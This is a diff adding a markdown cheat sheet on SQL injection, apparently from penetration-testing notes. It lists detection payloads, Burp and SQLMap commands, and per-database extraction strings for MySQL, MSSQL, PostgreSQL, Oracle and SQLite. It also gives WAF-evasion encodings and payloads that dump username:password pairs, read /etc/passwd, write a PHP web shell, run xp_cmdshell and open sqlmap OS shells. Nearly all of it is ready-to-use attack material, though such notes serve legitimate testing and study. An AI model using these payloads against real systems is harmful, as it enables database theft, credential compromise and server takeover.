@@ -1,0 +1,160 @@
+## SQL Injection
+
+- **What it is**
+  - A web vulnerability where attackers can inject malicious SQL code into database queries
+  - Allows unauthorized access to database content
+  - Can lead to data theft, manipulation, or server compromise
+  - Occurs when user input is improperly sanitized before being used in SQL queries
+
+- **How can we identify it**
+  - Single quote test: `parameter=value'`
+  - Double quote test: `parameter=value"`
+  - Boolean logic tests:
+    - `parameter=value' OR '1'='1`
+    - `parameter=value' OR '1'='2`
+  - Comment tests:
+    - `parameter=value'--`
+    - `parameter=value'#`
+  - Look for database error messages:
+    - MySQL: "You have an error in your SQL syntax"
+    - MSSQL: "Unclosed quotation mark"
+    - Oracle: "ORA-" errors
+    - PostgreSQL: "ERROR: syntax error at or near"
+  - Time-based detection:
+    - MySQL: `parameter=value' AND SLEEP(5)--`
+    - MSSQL: `parameter=value'; WAITFOR DELAY '0:0:5'--`
+    - PostgreSQL: `parameter=value'; SELECT pg_sleep(5)--`
+    - Oracle: `parameter=value' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)--`
+
+- **How to use Burp Suite for detection**
+  - Capture target request
+  - Send to Repeater (Ctrl+R)
+  - Modify parameter values with test payloads
+  - Analyze responses for errors or behavioral changes
+  - For automated testing:
+    - Send to Intruder (Ctrl+I)
+    - Set payload position (§value§)
+    - Load SQL injection payload list
+    - Start attack and look for anomalies
+
+- **How to use SQLMap**
+  - Basic scan: `sqlmap -u "https://target.com/page.php?id=1"`
+  - Scan specific parameter: `sqlmap -u "https://target.com/page.php?id=1" -p id`
+  - Use request file: `sqlmap -r request.txt`
+  - With cookies: `sqlmap -u "https://target.com/page.php?id=1" --cookie="PHPSESSID=1234"`
+  - Bypass WAF: `sqlmap -u "https://target.com/page.php?id=1" --tamper=space2comment,between,charencode`
+
+- **How do we find injectable columns**
+  - Determine number of columns using ORDER BY:
+    - `parameter=1' ORDER BY 1--`
+    - `parameter=1' ORDER BY 2--`
+    - Continue incrementing until error occurs
+    - Error indicates previous number is column count
+  - Alternatively, use UNION SELECT NULL technique:
+    - `parameter=1' UNION SELECT NULL--`
+    - `parameter=1' UNION SELECT NULL,NULL--`
+    - Continue until query works (no error)
+    - Number of NULLs = number of columns
+  - Identify string-accepting columns:
+    - `parameter=1' UNION SELECT 'a',NULL,NULL--`
+    - `parameter=1' UNION SELECT NULL,'a',NULL--`
+    - `parameter=1' UNION SELECT NULL,NULL,'a'--`
+    - Columns accepting 'a' can be used for string data
+
+- **How do we deal with the different databases**
+  - MySQL:
+    - Version: `parameter=1' UNION SELECT @@version,NULL,NULL--`
+    - Current database: `parameter=1' UNION SELECT database(),NULL,NULL--`
+    - List databases: `parameter=1' UNION SELECT group_concat(schema_name),NULL,NULL FROM information_schema.schemata--`
+    - List tables: `parameter=1' UNION SELECT group_concat(table_name),NULL,NULL FROM information_schema.tables WHERE table_schema='database_name'--`
+    - List columns: `parameter=1' UNION SELECT group_concat(column_name),NULL,NULL FROM information_schema.columns WHERE table_schema='database_name' AND table_name='table_name'--`
+    - Read file: `parameter=1' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--`
+    - Write file: `parameter=1' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL INTO OUTFILE '/var/www/html/shell.php'--`
+    - Error-based: `parameter=1' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--`
+    - Time-based blind: `parameter=1' AND IF(SUBSTR(database(),1,1)='a',SLEEP(5),0)--`
+    - Boolean blind: `parameter=1' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a'--`
+
+  - MSSQL:
+    - Version: `parameter=1' UNION SELECT @@version,NULL,NULL--`
+    - Current database: `parameter=1' UNION SELECT DB_NAME(),NULL,NULL--`
+    - List databases: `parameter=1' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM sys.databases--`
+    - List tables: `parameter=1' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM database_name..sysobjects WHERE xtype='U'--`
+    - List columns: `parameter=1' UNION SELECT STRING_AGG(name,','),NULL,NULL FROM database_name..syscolumns WHERE id=(SELECT id FROM database_name..sysobjects WHERE name='table_name')--`
+    - Execute commands: `parameter=1'; EXEC xp_cmdshell 'whoami'--`
+    - Error-based: `parameter=1' AND 1=CONVERT(int,(SELECT @@version))--`
+    - Time-based blind: `parameter=1'; IF (SELECT SUBSTRING(name,1,1) FROM sys.databases WHERE name='master')='m' WAITFOR DELAY '0:0:5'--`
+    - Boolean blind: `parameter=1'; IF (SELECT SUBSTRING(name,1,1) FROM sys.databases WHERE name='master')='m' SELECT 1 ELSE SELECT 0--`
+
+  - PostgreSQL:
+    - Version: `parameter=1' UNION SELECT version(),NULL,NULL--`
+    - Current database: `parameter=1' UNION SELECT current_database(),NULL,NULL--`
+    - List databases: `parameter=1' UNION SELECT string_agg(datname,','),NULL,NULL FROM pg_database--`
+    - List tables: `parameter=1' UNION SELECT string_agg(table_name,','),NULL,NULL FROM information_schema.tables WHERE table_schema='public'--`
+    - List columns: `parameter=1' UNION SELECT string_agg(column_name,','),NULL,NULL FROM information_schema.columns WHERE table_schema='public' AND table_name='table_name'--`
+    - Read file: `parameter=1' UNION SELECT pg_read_file('/etc/passwd'),NULL,NULL--`
+    - Write file: `parameter=1' UNION SELECT NULL,pg_write_file('/tmp/test.txt', 'data'),NULL--`
+    - Error-based: `parameter=1' AND 1=cast(version() as int)--`
+    - Time-based blind: `parameter=1' AND CASE WHEN (SELECT substring(current_database(),1,1))='p' THEN pg_sleep(5) ELSE pg_sleep(0) END--`
+    - Boolean blind: `parameter=1' AND (SELECT ASCII(substring(current_database(),1,1))=112)--`
+
+  - Oracle:
+    - Version: `parameter=1' UNION SELECT banner,NULL,NULL FROM v$version--`
+    - Current database: `parameter=1' UNION SELECT SYS.DATABASE_NAME,NULL,NULL FROM dual--`
+    - List tables: `parameter=1' UNION SELECT table_name,NULL,NULL FROM all_tables--`
+    - List columns: `parameter=1' UNION SELECT column_name,NULL,NULL FROM all_tab_columns WHERE table_name='TABLE_NAME'--`
+    - Error-based: `parameter=1' AND EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % remote SYSTEM "'||(SELECT username FROM all_users WHERE rownum=1)||'"> %remote;]>'),'/l') FROM dual--`
+    - Time-based blind: `parameter=1' AND CASE WHEN SUBSTR(user,1,1)='S' THEN dbms_pipe.receive_message('RDS',5) ELSE dbms_pipe.receive_message('RDS',0) END FROM dual--`
+    - Boolean blind: `parameter=1' AND (SELECT SUBSTR(username,1,1) FROM all_users WHERE rownum=1)='S'--`
+
+  - SQLite:
+    - Version: `parameter=1' UNION SELECT sqlite_version(),NULL,NULL--`
+    - List tables: `parameter=1' UNION SELECT group_concat(name),NULL,NULL FROM sqlite_master WHERE type='table'--`
+    - List columns: `parameter=1' UNION SELECT sql,NULL,NULL FROM sqlite_master WHERE name='table_name'--`
+    - Error-based: `parameter=1' AND 1=CAST((SELECT sqlite_version()) AS int)--`
+    - Time-based blind: `parameter=1' AND (SELECT CASE WHEN (SELECT substr(name,1,1) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%' LIMIT 1)='a' THEN randomblob(100000000) ELSE 1 END)--`
+    - Boolean blind: `parameter=1' AND substr((SELECT name FROM sqlite_master WHERE type='table' LIMIT 0,1),1,1)='a'--`
+
+- **WAF Bypass Techniques**
+  - Space alternatives:
+    - Comment: `SELECT/**/username/**/FROM/**/users`
+    - Tabs/newlines: `SELECT[TAB]username[TAB]FROM[TAB]users`
+    - Parentheses: `SELECT(username)FROM(users)`
+  - Case manipulation: `SeLeCt UsEr FrOm DuAl`
+  - String concatenation:
+    - MySQL: `CONCAT('SEL','ECT')`
+    - Oracle: `'SEL'||'ECT'`
+    - MSSQL: `'SEL'+'ECT'`
+  - Comment variations:
+    - `-- comment`
+    - `/* comment */`
+    - `/*! MySQL-specific */`
+  - Encoding:
+    - URL encoding: `%53%45%4C%45%43%54` (SELECT)
+    - Double URL encoding: `%2553%2545%254C%2545%2543%2554`
+    - Hex encoding: 
+      - MySQL: `0x53454c454354` (SELECT)
+      - MSSQL: `CHAR(0x53)+CHAR(0x45)+CHAR(0x4c)+CHAR(0x45)+CHAR(0x43)+CHAR(0x54)`
+
+- **Advanced Exploitation Techniques**
+  - Retrieve multiple rows in one shot:
+    - MySQL: `parameter=1' UNION SELECT 1,GROUP_CONCAT(username,':',password SEPARATOR '\n'),3 FROM users--`
+    - MSSQL: `parameter=1' UNION SELECT 1,STRING_AGG(username+':'+password, CHAR(10)),3 FROM users--`
+    - PostgreSQL: `parameter=1' UNION SELECT 1,STRING_AGG(username||':'||password, CHR(10)),3 FROM users--`
+    - Oracle: `parameter=1' UNION SELECT 1,LISTAGG(username||':'||password, CHR(10)) WITHIN GROUP (ORDER BY username),3 FROM users--`
+  - Blind exploitation with binary search:
+    - Length detection: `parameter=1' AND LENGTH((SELECT password FROM users WHERE username='admin'))=5--`
+    - Character extraction: `parameter=1' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>90--`
+  - Second-order injection:
+    - Insert malicious input that gets stored in DB
+    - Payload activates when used in subsequent queries
+    - Example: store `admin'--` as username, might bypass authentication checks later
+
+- **SQLMap Advanced Usage**
+  - Enumerate databases: `sqlmap -u "https://target.com/page.php?id=1" --dbs`
+  - Enumerate tables: `sqlmap -u "https://target.com/page.php?id=1" -D database_name --tables`
+  - Enumerate columns: `sqlmap -u "https://target.com/page.php?id=1" -D database_name -T table_name --columns`
+  - Dump data: `sqlmap -u "https://target.com/page.php?id=1" -D database_name -T table_name -C column1,column2 --dump`
+  - Get OS shell: `sqlmap -u "https://target.com/page.php?id=1" --os-shell`
+  - Get SQL shell: `sqlmap -u "https://target.com/page.php?id=1" --sql-shell`
+  - Get database credentials: `sqlmap -u "https://target.com/page.php?id=1" --passwords`
+  - Test all parameters: `sqlmap -u "https://target.com/page.php" --crawl=3 --forms --batch --random-agent --level=5 --risk=3`
